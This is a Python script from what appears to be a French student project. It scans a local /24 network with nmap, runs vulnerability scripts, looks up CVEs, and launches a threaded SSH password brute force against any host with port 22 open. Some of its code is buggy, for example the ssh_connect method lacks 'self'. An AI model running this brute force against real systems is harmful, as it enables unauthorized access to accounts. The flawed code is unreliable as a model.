#!/usr/bin/env python
# 
# Projet Tuteuré Version 1.0.3 (2022)
#
# This tool may be used for legal purposes only.  Users take full responsibility
# for any actions performed using this tool. The author accepts no liability for
# damage caused by this tool.  If these terms are not acceptable to you, then do 
# not use this tool.
# 
# by Pierre CHAUSSARD
# 
# 19-Mar-2022 - 1.0.0 - [ADD] Basic script.
# 20-Mar-2022 - 1.0.1 - [ADD] Network & Nmap scan.
# 21-Mar-2022 - 1.0.2 - [ADD] Json reader.
# 22-Mar-2022 - 1.0.3 - [ADD] SSH bruteforce.
# 

import nmap, socket, json, pyfiglet, paramiko, sys
from pycvesearch import CVESearch
from datetime import datetime
from threading import Thread


class Network(object):
    def __init__(self):
        print(pyfiglet.figlet_format("PROJET TUT.PY"))
        self.ip = input(f"Entrer une adresse IP (l'adresse IP de cette machine est par défaut :\n{socket.gethostbyname(socket.gethostname())}, pour la selectionner appuyez sur ENTRER).\n>")
        self.hosts = []
        self.nm = nmap.PortScanner()
        self.cve = CVESearch()
    
    def section_print(self, title):
        print("\n" + "=" * 50)
        print(title)
        print("=" * 50 + "\n")

    def network_scanner(self):
        if len(self.ip) == 0:
            network = f"{socket.gethostbyname(socket.gethostname())}/24"
        else:
            network = self.ip + '/24'
        
        print("\nScan réseau en cours ...")
        self.nm.scan(hosts = network, arguments = "-sn")
        hosts_list = [(x, self.nm[x]['status']['state']) for x in self.nm.all_hosts()]

        print("=" * 50)
        for host, status in hosts_list:
            print("Hôte\t{}\t{}".format(host, status))
            self.hosts.append(host)
        print("=" * 50)
        # print(hosts_list)
    
    def nmap_scan(self, host):
        print(f"\nDébut du scan Nmap pour :\t{host}")
        scan_result = self.nm.scan(hosts = host, arguments = '-sV -p 20-450 --script="vuln and safe"')
        # print(scan_result)

        with open(f"scan/{host}.json", "w", encoding = "utf-8") as f:
            f.write(json.dumps(scan_result, indent = 4, sort_keys = True))
    
    def read_json_scan(self, ip):
        with open(f"scan/{ip}.json", "r", encoding = "utf-8") as f:
            arr = []
            res = json.loads(f.read())
            # print(res['scan']['192.168.56.0']['tcp'])
            print("PORT\tSTATE\tSERVICE")
            for port in res['scan'][ip]['tcp']:
                print("{}/tcp\t{}\t{}".format(port, res['scan'][ip]['tcp'][port]['state'], res['scan'][ip]['tcp'][port]['name']))
                print("| Product: {}".format(res['scan'][ip]['tcp'][port]['product']))
                try:
                    print("| Script:")
                    for script_statment in res['scan'][ip]['tcp'][port]['script']:
                        print("| | {}: ".format(script_statment.lower()) + res['scan'][ip]['tcp'][port]['script'][script_statment])
                        arr.append(res['scan'][ip]['tcp'][port]['script'][script_statment])
                except:
                    pass
                print("| Version: {}".format(res['scan'][ip]['tcp'][port]['version']))
            print("\nAnalyse Nmap finie pour {}: {} hôte scanné en {}s.".format(ip, res['nmap']["scanstats"]["uphosts"], res['nmap']["scanstats"]["elapsed"]))

    def cve_finder(self):
        try:
            cve_entry = str(input("\nSaisissez un code CVE pour votre recherche:\n>"))
            cve_result = self.cve.id(cve_entry)

            with open(f"cve/{cve_entry}.json", "w", encoding = "utf-8") as f:
                f.write(json.dumps(cve_result, indent = 4, sort_keys = True))
        except:
            pass
    
    def ssh_connect(ip, username, password, port = 22):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, port, username, password)
            print("Mot de passe trouvé : " + password)
            return True
        except:
            return False

    def ssh_bruteforce(self, ip):
        user = str(input("Entrer un nom d'utilisateur :\n>"))
        wordl = str(input("Entrer un dictionnaire de mots de passe (juste le nom du fichier, sans l'extension) :\n>"))

        with open(f"wordlists\{wordl}.txt", 'r', encoding = "utf8") as file:
            for line in file.readlines():
                th = Thread(target = self.ssh_connect, args = (ip, user, line.strip()))
                th.start()

    def ssh_detection(self, host):
        with open(f"scan/{host}.json", "r", encoding = "utf-8") as f:
            res = json.loads(f.read())
            for port in res['scan'][host]['tcp']:
                if port == '22':
                    print("Hôte\t{}\nPort ssh (22) ouvert.\nLancement d'un bruteforce sur cet hôte.".format(host))
                    self.ssh_bruteforce(host)
                    break

    def projet_tut(self):
        self.network_scanner()
        for i in range(len(self.hosts)):
            self.nmap_scan(self.hosts[i])
            self.read_json_scan(self.hosts[i])
            self.cve_finder()
            self.ssh_detection(self.hosts[i])


if __name__ == "__main__":
    try:
        Nscan = Network()
        Nscan.projet_tut()
    except KeyboardInterrupt:  
        print("\n[x] Fermeture du programme !")
        sys.exit()
